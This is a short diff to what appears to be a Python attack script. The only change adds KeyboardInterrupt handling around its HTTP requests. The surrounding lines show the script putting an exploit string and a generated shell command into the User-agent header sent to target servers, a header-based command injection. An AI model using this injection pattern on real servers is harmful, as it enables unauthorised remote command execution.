@@ -102,6 +102,8 @@ if bool(URLS):
 
                 try:
                     RESPONSE = br.open(generated_url, None, 3)
+                except KeyboardInterrupt:
+                    sys.exit(0)
                 except:
                     pass
         else:
@@ -116,6 +118,8 @@ if bool(URLS):
                     br = Browser()
                     br.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
                     RESPONSE = br.open(base_url, None, 3)
+                except KeyboardInterrupt:
+                    sys.exit(0)    
                 except:
                     pass
 
